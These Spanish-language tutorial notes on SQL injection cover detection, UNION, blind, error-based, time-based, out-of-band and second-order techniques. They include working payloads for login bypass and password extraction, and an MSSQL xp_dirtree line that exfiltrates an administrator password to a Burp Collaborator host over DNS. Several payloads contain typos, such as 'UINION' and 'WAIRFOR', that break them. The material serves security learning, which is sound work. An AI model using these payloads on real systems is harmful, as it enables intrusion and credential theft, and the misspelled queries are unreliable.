# ¿Que es?
La *Inyección SQL (SQLi)* es una vulnerabilidad de seguridad web que permite a un atacante interferir en las consultas que realiza una aplicación a la base de datos. Permitiendo a un atacante obtener datos que pertenecen a otros usuarios, o datos a los cuales solo la aplicación puede acceder. El atacante puede modificar, consultar e incluso eliminar estos datos causando cambios persistentes en el contenido o comportamiento de la aplicación.

Estos ataques pueden permitir también al atacante escalarlo llegando a poder comprometer un servidor subyacente u otra infraestructura de back-end.

# ¿Cómo detectarla?
Para detectar esta vulnerabilidad es necesario encadenar o usar un conjunto sistemático de pruebas contra cada punto de entrada en la aplicación, normalmente suelen ser las siguiente pruebas:
- Inclusión en entradas del carácter `'` y buscar anomalías o errores
- Algunas sintaxis especificas de *SQL* que evalué el valor original del punto de entrada y a un valor diferente, buscando diferencias sistemáticas en las respuestas de la aplicación
- Condiciones booleanas como `OR 1=1` y `OR 1=2` y buscar diferencias en las respuestas de una aplicación
- Payloads  diseñados para desencadenar retrasos de tiempo cuando se ejecutan dentro de una consulta *SQL*  y buscar diferencias de tiempos en las respuestas
- Payloads *OAST  (Out-of-Band Application Security Testing)* diseñadas para desencadenar una interacción de red fuera de banda cuando se ejecuta dentro de una consulta *SQL* y monitorear cualquier interacción resultante

# Inyección SQL en diferentes partes de la consulta
La mayoría de las inyecciones ocurren en las consultas `SELECT` en el campo `WHERE`, esta suele ser la mas común, pero también se pueden acontecer en cualquier otra ubicación, como por ejemplo en las declaraciones:
- `UPDATE` dentro de los valores actualizados o en la clausula `WHERE
- `INSERT` dentro de los valores insertados
- `SELECT` dentro de la tabla o el nombre de la columna
- `SELECT` dentro de la clausula `ORDER BY`

# Ejemplos de inyecciones SQL
Hay infinidad de vulnerabilidad, ataques y técnicas de inyección SQL que ocurren en diferentes situaciones, algunos ejemplos comunes pueden ser:




## Recuperar de datos ocultos
Este ataque es donde se puede modificar una consulta *SQL* para devolver resultados adicionales.

Imagina en una aplicación de compra que muestra productos en diferentes categorías, cuando el usuario haga clic en *Categorías* -> *Regalos* su navegador solicitara
```sql
https://insecure-website.com/products?category=Gifts
```

Esto hace que la aplicación realice una consulta *SQL* para recuperar los detalles de los productos relevantes de la base de datos
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

Esta consulta pide a la base de datos que devuelta
- Todos los detalles *`*`*
- Desde la tabla de *`products`*
- Donde *`category`* sea *`Gifts`*
- Y *`released`* sea *`1`*

La ultima restricción `released = 1` se esta usando para ocultar productos que no se han lanzado todavía, podríamos asumir que estos productos ocultos se encuentran en `released = 0`

La aplicación no implementa ningún sistema de defensa contra ataques de *Inyección SQL*. Por lo cual un atacante podría construir el siguiente ataque:

```sql
https://insecure-website.com/products?category=Gifts'--
```

Esto se traduce a la consulta *SQL*
```sql
SLECET * FROM products WHERE category = 'Gifts'--' AND released = 1
```

En esta consulta se incluyen los caracteres de comentario en *SQL* `--` al incluirlos en la consulta detrás de una `'` la consulta interpreta que se cierra la sentencia al finalizar en `Gifts` y todo lo que se acontece a continuación se basa en un comentario haciendo que no se incluya `AND released = 1`, Como resultado se obtendrían tanto los productos lanzados como los no lanzados.

También se puede ejecutar de cierta forma en la que se puede hacer que la aplicación muestre todos los productos de cualquier categoría incluyendo categorías de las que no se tiene conocimiento

```sql
https://insecure-website.co,/products?category=Gifts'+OR+1=1--
```

El símbolo `+` se usa para concatenar o sustituir al espacio corriente
Siendo esto una consulta *SQL*
```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

Esta consulta modificada devuelve todos los artículos que su `category` es `Gifts` o que `1` sea igual a `1` como esta consulta siempre es cierta y siempre se cumple devuelve todos los elementos.

## Evadir la lógica de la aplicación
En los casos en la que la aplicación permite a los usuarios iniciar sesión con nombre de usuario y contraseña el usuario envía las credenciales por ejemplo `wiener` como usuario y de contraseña `bluecheese`, si al consulta es afirmativa entonces el inicio de sesión es exitoso, de lo contrario se rechaza.

En este caso un usuario puede iniciar sesión como cualquier usuario sin la necesidad de una contraseña. Se puede realizar usando usando una secuencia de comentarios SQL `--` para eliminar la comprobación de contraseña en la cláusula `WHERE` 

Por ejemplo queremos acceder como `administrator` y la consulta es:
```sql
SELECT * FROM users WHERE username = '' AND password = ''
```

Como atacante deberemos de omitir la validación de la contraseña introduciendo los siguientes parámetro en el campo de login
```sql
administrator'--
```

Lo que transformaría la consulta en el siguiente campo, permitiéndonos acceder como usuario administrador
```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```


## Recuperar datos de otras tablas
En los casos en los que un atacante puede recuperar los resultados de la consulta SQL este mismo atacante puede usar esto para recuperar datos de otras tablas dentro de la base de datos.
Pudiendo usar la sentencia `UNION` con la consulta `SELECT`.

Por ejemplo si una aplicación ejecuta la siguiente consulta con la entrada por parte del usuario del filtro `Gifts`
```sql
SELECT name, description FROM products WHere category = 'Gifts'
```

Un atacante se puede aprovechar de ellos usando `UNION SELECT`
```sql
' UINION SELECT username, password FROM users --
```
 
 Esto nos permite obtener todos los nombres de usuario y contraseñas junto con las descripciones de los productos

## Inyección SQL ciega

 Muchas de las vulnerabilidades que se acontecen en SQL son vulnerabilidades ciegas, lo que significa que la aplicación no devuelve los resultados de la consulta SQL o los detalles de cualquier error de la base de datos dentro de sus respuestas.
## Inyección SQL de segundo orden (Almacenada)
La inyección SQL de primer orden se genera cuando la aplicación procesa una entrada por parte del usuario a partir de una solicitud HTTP e incorpora la entrada en una consulta de manera insegura.

La inyección de segundo orden se produce cuando la aplicación toma la entrada del ususario de una solicitud HTTP y la almacena para su futuro uso. Generalmente esto se produce colocando la entrada en la base de datos, pero no se produce ninguna vulnerabilidad en el punto donde se almacenan los datos. Posteriormente al manejar una solicitud HTTP diferente, la aplicación recupera los datos almacenados y los incorpora en una consulta SQL de manera insegura, esta inyección también se conoce como inyección SQL almacenada.

# Examinar la base de datos
Es necesario una vez identificada la vulnerabilidad de inyección SQL saber sobre que tipo de base de datos estamos trabajando ya que en cada una las consultas pueden ser diferentes entre si.

## Consultar el tipo y la versión de la base de datos

| Tipo       | Consulta                   |
| ---------- | -------------------------- |
| MSQL       | `SELECT @@version`         |
| MySQL      | `SELECT @@version`         |
| Oracle     | `SELECET * FROM v$version` |
| PostgreSQL | `SELECT version()`         |

Por ejemplo si queremos consultar la versión podemos usar `UNION`
```sql
' UNION SELECT <consulta>--
```

Con ello podríamos confirmar de que tipo de base de datos estamos tratando

## Listar el contenido de la base de datos non-Oracle
La mayoría de las bases de datos menos *(Oracle)* tienen un conjunto de vistas llamadas *information schema* la cual proporciona información sobre la base de datos.
Por ejemplo si queremos enumerar las tablas de la base de datos podemos usar
```sql
SELECT * FROM information_schema.tables
```

Devolviéndonos las tablas que hay dentro de la base de datos
Entonces ahora conociendo las tablas podemos enumerar las columnas
```sql
SELECT * FROM information_schema.tables WHERE table_name = '<nombreTabla'
```

Devolviéndonos las columnas de la tabla especificada y el tipo de dato en cada columna

## Listar el contenido de una base de datos Oracle
Para listar el contenido de una base de datos Oracle se utiliza la consulta `all_tables` para enumerar las tablas
```sql
SELECT * FROM all_tables
```

Y `all_tab_columns` para enumerar las columnas
```sql
SELECT * FROM all_tab_columns WHERE table_name = '<nombreTabla>'
```

# Inyección SQL UNION
Cuando se acontece una vulnerabilidad SQL en una aplicación web se puede usar la clausula `UNION` para recuperar datos de otras tablas dentro de la base de datos.

Al usar `UNION` se nos permite ejecutar una o mas consultas `SELECT` adicionales y añadir los resultados a la consulta original.
```sql
SELECT a, b FROm table1 UNION SELECT c, d FROM table2
```

Esta consulta devuelve un único conjunto de resultados en dos columnas que contiene los valores de las columnas `a` y `b` de la `table1` y los valores `c` y `d` de la `table2`

Para poder trabajar con una consulta `UNION` se deben de cumplir dos requisitos clave
- Las consultas individuales deben devolver el mismo numero de columnas
- Los tipos de datos en cada columna debe ser compatibles entre las columnas individuales

Para llevar a cabo un ataque de este estilo se tienen que resolver las siguientes cuestiones
- ¿Cuántas columnas se devuelven de la columna original?
- Que columnas devueltas de la consulta original 

## Determinar el numero de columnas
Cuando se realiza un ataque SQL hay dos métodos para determinar el numero de columnas que se devuelven en la consulta original.

Una de las técnicas es el uso de la clausula `ORDER BY` e ir incrementando el índice de la columna hasta que se produzca un error. Por ejemplo si el punto de inyección se encuentra en la clausula `WHERE` original se usaría de la siguiente forma
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

Este payload de lo que se encarga es de modificar la consulta original para ordenar los resultados por diferentes consultas. Cuando se excede del numero de columnas la base de datos devolverá un error, en caso de que no se devuelva el error cualquier cambio o variación en la respuesta pude inferir en cuantas columnas tiene la base de datos.

La otra técnica que se usa consiste en usar una seria de `UNION SELECT` con valores vacías hasta que se devuelva el error o cualquier cambio o variación en la respuesta de la petición
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL, NULL--
```

Se usa `NULL` y no caracteres ya que el tipo de dato `NULL` es compatible con todos los datos originales de  ya que este es convertible a cualquier tipo de dato común lo cual maximiza las capacidades de éxito en el recuento de columnas.

## Enumerar columnas con un tipo de dato útil
Los datos mas interesantes que se buscan recuperar a la hora de realizar una inyección *SQL* son las cadenas de texto, por lo cual deberemos de determinar primero el numero de columnas que se encuentran y luego sondear columna a columna cual de ella contiene texto.
Por ejemplo su sabemos que estamos ante 4 columnas usaremos un payload semejante a este
```sql
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

SI el tipo de datos inyectado en la columna no es compatible recibiremos un error, en caso de no recibir un error y la respuesta contiene algún contenido adicional que incluya el valor de la cadena inyectada, entonces la columna identificada es relevante para recuperar datos de ella.

## Recuperar datos de otras tablas
Una vez tenemos identificado el numero de columnas devueltas y hemos localizado las columnas que pueden contener datos de cadena esta en condiciones para recuperar datos interesantes.
Supongamos que la consulta original devuelve dos columnas, ambas de las cuales pueden contener datos. El punto de inyección es una cadena citada dentro de la clausula `WHERE`. La base de datos contiene una tabla llamada `users` mediante la entrada
```sql
' UNION SELECT username, password FROM users--
```

Para llevar a cabo este ataque es necesario conocer que hay una tabla llamada `users` con dos columnas identificadas como `username` y `password`. Sin esta información habría que adivinar los nombres de las tablas y columnas, todas las bases de datos moderna proporcionan diversas formas para examinar la estructura de la base de datos y determinar que tablas y columnas contienen

## Recuperación de múltiples valores dentro de una sola columna
En algunos casos puede ser que las consultas de cadena de texto solo puedan ser mostradas en una sola columna. Se mostrarían los valores juntos y se pueden añadir separadores para facilitar la lectura de estos datos extraídos.
Por ejemplo en una base de datos de Oracle se puede usar
```sql
' UNION SELECT username || '~' || password FROM users--
```

# Inyección SQL ciega
Una vulnerabilidad de inyección SQL ciega *blind* se acontece cuando la aplicación es vulnerable a *inyección SQL* pero la aplicación no muestra información ni varia el contenido de las respuestas `HTTP`.

Muchas técnicas como los ataques `UNION` no son efectivos en este tipo de vulnerabilidades.

## ¿Cómo explotarlo?
### Respuestas condicionales (Blind)
Este tipo de respuesta se obtiene cuando el resultado son respuesta condicionales por parte de la aplicación, si y no, blanco y negro, 1 y 0...

Pongámonos en el caso donde las solicitudes de la aplicación incluyen un encabezado de cookie como el siguiente
```sql
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```

Cuando una solicitud contiene el `TrackingId` la cookie es procesada y la aplicación puede determinar basándose en la cookie si se trata de un usuario conocido.
La petición SQL seria la siguiente
```SQL
SELECT TrackingId FROM TrackedUSers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

Esta consulta es vulnerable a la inyección SQL pero sin devolverle información al usuario.
Pero se comparta diferente si el `TrackingId` es reconocido la consulta devuelve un bienvenido en la respuesta.

Esto hace que la consulta sea vulnerable ya que se puede recuperar información activando diferentes respuestas condicionalmente.
Supongamos que se envían dos peticiones que contienen los siguientes valores en el valor de `TrackingId`
```sql
...xyz' AND '1'='1
...xyz' AND '1'='2
```

El primer caso provoca que la consulta resuelva correctamente y obtengamos el mensaje de bienvenida ya que al condición de `1=1` es verdadera
La segunda condición no devuelve ningún contenido ya que la condición de `1=2` es falsa

Ahora hay una tabla llamada `Users` con las columnas `Username` y `Password`, y un usuario llamado `Administrator`. Con este método podríamos determinar la contraseña de este usuario. Para ello tendremos que realizar las siguientes entradas
```sql
...xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```

Con esta entrada lo que haremos es:
- `AND` buscamos que además de la cookie se cumpla lo siguiente
- `SUBSTRING` extrae un fragmento de texto donde
	- Empieza en el primer carácter `1`
	- Tienen una longitud de `1`
- `(SELECT ....)` selecciona la contraseña del usuario `Administrator`
- `> 'm` compara si el primer carácter de la cadena es mayor alfabéticamente a `m`

Si nos devuelve un mensaje de bienvenida deberemos de concretar en que rango de caracteres se encuentra el primer carácter
```sql
...xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
```

Al no devolvernos un bienvenido sabemos que el primer carácter de la contraseña  es mayor alfabéticamente que `m` pero no mayor que `t`
Al saber esto ahora podemos ir igualando el rango de caracteres que se encuentra de por medio en búsqueda de un nuevo mensaje de bienvenida, por ejemplo probando con el carácter `s` obtenemos este mensaje desead
```sql
...xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```

Ahora deberemos de seguir con el segundo carácter, sabemos que el primero es `s` para encontrar el segundo deberemos de modificar el `SUBSTRING` e indicarle que buscamos sobre el segundo carácter con una longitud de uno `SUBSTRIN ((...), 2, 1)...` y así sucesivamente *`SUBSTRING` en Oracle se usa como `SUBSTR`*

### Basados en errores condicionales (Blind error-based)
Esta inyección SQL se basa en la búsqueda de errores que nos permitan extraer la información de la base de datos.
- Es posible que se pueda inducir a la aplicación a devolver una respuesta de error especifica basada en el resultado de una expresión booleana (si - no)
- Es posible que se puedan activar los mensajes de error que generan los datos devueltos por la consulta.

### ¿Como explotar Error-based?
En ocasiones, podemos aprovechar los errores que devuelve la base de datos para obtener información sobre ella.
La técnica consiste en provocar un error SQL de forma condicionada, de manera que la aplicación se comporte de forma diferente dependiendo de si una condición es verdadera o falsa.
Para ello, podemos utilizar la expresión `CASE WHEN`, que permite evaluar una condición y ejecutar una expresión u otra en función del resultado.

Por ejemplo, supongamos que enviamos las siguientes solicitudes modificando el valor de la cookie `TrackingId`:

```
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a

xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

¿Qué ocurre en cada solicitud?
1. Primera solicitud (`1=2`): La condición es falsa, por lo que se ejecuta `ELSE 'a'`. La expresión devuelve `'a'` y no se produce ningún error.
    
2. Segunda solicitud (`1=1`): La condición es verdadera, por lo que se ejecuta `THEN 1/0`. Esto provoca un error de división por cero en la base de datos.

Si la aplicación devuelve respuestas diferentes cuando se produce el error SQL, podemos utilizar ese comportamiento como un mecanismo para comprobar condiciones dentro de la base de datos.

Por ejemplo, podríamos sustituir `1=1` por una condición que compruebe si existe un usuario concreto, si una contraseña comienza por determinada letra o si un carácter de una columna tiene un valor específico.

También podemos obtener datos probando un carácter a la vez, y obtener pro ejemplo la contraseña del usuario de forma progresiva
```sql
`xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`
```

- `Username = 'Administrator'`: selecciona el registro del usuario Administrator.
- `SUBSTRING(Password, 1, 1)`: obtiene el primer carácter de su contraseña.
- `> 'm'`: comprueba si ese carácter es alfabéticamente posterior a la letra `m`.
- Si la condición es verdadera, se provoca un error mediante `1/0`.
- Si es falsa, se devuelve `'a'` y no se provoca el error.

### Basados en retrasos de tiempo (Blind delay Time-Based)
Esta vulnerabilidad se acontece cuando la aplicación no devuelve ningún tipo de error o dato relevante, muchas veces se puede acontecer un retraso de tiempo dependiendo de las respuestas, permitiendo esto determinar 
### ¿Cómo explotarlo?
Las técnicas para desencadenar un retardo de tiempo son diferentes dependiendo del tipo de bases que se utilice, por ejemplo en *MSSQL* se puede usar la siguiente expresión y probar si existe un retraso de tiempo
```sql
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAIRFOR DELAY '0:0:10'--
```

La primera inyección no desencadenaría un retraso de tiempo por que `1=2` es falso, en cambio la segunda inyección si que lo haría ya que `1=1` es verdadero y habría un retaso de `10sec`

Usando esta técnica podríamos recuperar datos probando carácter a carácter
```sql
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```

- `';` Cerramos la consulta original
- `IF` permite ejecutar la condición siempre y cuando sea verdadera
- `SELECT(COUNT(Username) FROM Users` Cuenta los registros que hay en la columna
- `WHERE Username = ' Administrator' AND SUBSTRING(Password, 1, 1)> 'm'` Busca en el campo Administrator y valida si el primer carácter de la contraseña `1, 1` es superior en orden alfabético a `m`
- `= 1` Comprueba el resultado, si devuelve `1` será True si no False
- `WAITFOR DELAY` Provoca un retraso al ser devuelto un resultado `TRUE` o `1`

### Basadas en inyecciones ciegas fuera de banda (Blind out-of-band)
Este tipo de vulnerabilidad se acontece cuando la aplicación continua procesando la solicitud del usuario en el hilo original pero esta utiliza otro hilo para realizar la consulta SQL.
Imaginemos que tenemos una inyección SQL pero que no se muestra ningún tipo de resultado en las consultas, no tenemos errores, ni retrasos de tiempo. Es decir tenemos la vulnerabilidad pero no un canal visible para extraer la información de esta.

La idea es la siguiente:
- Introducimos una inyección SQL en la aplicación
- Conseguimos que la base de datos de la aplicación genere una consulta DNS
- Esa consulta llega a nuestro servidor DNS
- Nosotros observamos esa petición
- A partir de ella podemos ir obteniendo información de la base de datos

Se utiliza un servidor DNS ya que muchas aplicaciones lo usan para realizar consultas DNS hacia el exterior y podemos usar este canal de comunicación como canal de extracción
### ¿Cómo explotarlo?
La herramienta mas sencilla para realizar este tipo de ataques es Burp Collaborator.
Este es un servidor que proporciona varias implementaciones de diferentes servicios de red entre ellos DNS, y permite detectar cuando este recibe iteraciones de red como resultado del envió de payloads a una aplicación vulnerable.

Dependiendo de la base de datos las técnicas son diferentes en caso de MSSQL se puede provocar de la siguiente forma:
```sql
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```
- `';` se cierra la cadena anterior y se separan las dos sentencia
- `exec` Permite ejecutar un procedimiento almacenado
- `master..xp_dirtree` Ejecuta el procedimiento `xp_dirtree` que se encuentra asociado a la base de datos `master`, el cual nos permite apuntar a una ruta externa

Haciendo que se genere una búsqueda para el dominio `0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net`

Una vez hemos conseguido que la aplicación web realice consultas a nuestro servidor DNS, es el momento de obtener los datos que nos interesan de la base de datos, por ejemplo obtener la contraseña del usuario Administrator
```sql
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```

En este caso al ser MSSQL la petición realiza lo siguiente:
- `DECLARE @p VARCHAR(1024);` -> Creamos una variable con el tipo de dato `VARCHAR` (Cadena de caracteres) con una longitud máxima de `1024`, nos sirve para tener una variable en la que poder almacenar la contraseña que queremos obtener
- `set @p=(SELECT password FROM users WHERE username='Administrator')` -> Realizamos la consulta donde obtenemos la contraseña del usuario y la almacenamos en nuestra varia `@p`
- `exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--` -> Ejecutamos `master..xp_dirtree` el cual nos permite listar el contenido de un directorio, con el entre canillado, procederemos a encadenar el prefijo de la ruita `//` la contraseña extraída almacenada en `@p` que la deberemos de pasar con espacio de entre las comillas simples, y para finalizar le concatemos el dominio de nuestro DNS.

Dando como resultado la siguiente concatenación `//P@ssw0rd123.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a`

# Inyección a través de errores visibles (Visible error-based)
Muchas veces la base de datos nos devuelve errores con una alta capacidad de verbosidad,, aportando al atacante información útil. Por ejemplo este mensaje que se acontece después de inyectar un carácter especias después de un parámetro `id`
```alert
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
```

Esto nos muestra la consulta completa que a aplicación usa en nuestra entrada, pudiendo ver que usa una declaración `WHERE`.

Este error puede ser provocado por parte del atacante, por ejemplo se puede usar la función `CAST()` que permite convertir un tipo de datos a otro, por ejemplo imagina la siguiente consulta
```sql
CAST((SELECT example_column FROM example_table) AS int)
```

Lo mas seguro es que los datos que estas intentando leer sean una cadena de texto `VARCHAR`, intentar cambiar este tipo de datos a un formato incompatible como `INT` podemos obtener un error similar al siguiente
```alert
ERROR: invalid input syntax for type integer: "Example data"
```

Este tipo de consultas también es útil si un limite de caracteres impide activar respuestas condicionales

# Inyección SQL en diferentes contextos
Hasta el momento todas las consultas que hemos realizado se han realizado sobre la misma cadena de consulta, pero estas inyecciones se pueden realizar sobre cualquier entrada controlable que la aplicación procese como una consulta SQL, muchas web usan los formatos JSON y XML para realizar consultas a la base de datos.

Esto nos abre campos de explotación debido a que los campos normales de consulta muchas veces ya están bloqueados por el WAF, lo cual estos otros métodos nos pueden permitir ofuscar nuestros ataques.
La mayoría de las veces las implementaciones de seguridad filtran los ataques por palabras clave en una inyección SQL como por ejemplo `SELECT` por lo que si esto es así se puede eludir usando un escapado de caracteres o una codificación `&#x53;ELECT` en este caso estamos codificando el carácter `S` usando un escape de caracteres `XML`
```XML
<stockCheck> 
	<productId>123</productId>
	<storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId> </stockCheck>
```

# Inyección de segundo orden (Second-Order)
La inyección de primer orden es cuando la aplicación tramita la entrada por parte del usuario a partir de la solicitud HTTP y esta incorpora la entrada como una consulta insegura de SQL.

La de segundo orden se produce cuando la entrada del usuario se realiza a través de una solicitud HTTP y esta petición es almacenada para un futuro uso. Esta petición se queda almacenada y cuando llega el momento de ser utilizada se realiza la consulta en la base de datos, también es conocido como inyección SQL almacenada.

Por ejemplo, un usuario se crea una cuenta nueva en una web, tramita la solicitud de crear la cuenta y accede directamente a la web, la solicitud se queda almacenada. Una vez el usuario sale de la pagina web y quiere volver a entrar haciendo login, se tramita la solicitud de añadir un nuevo usuario en la base de datos y esta tramita la petición.
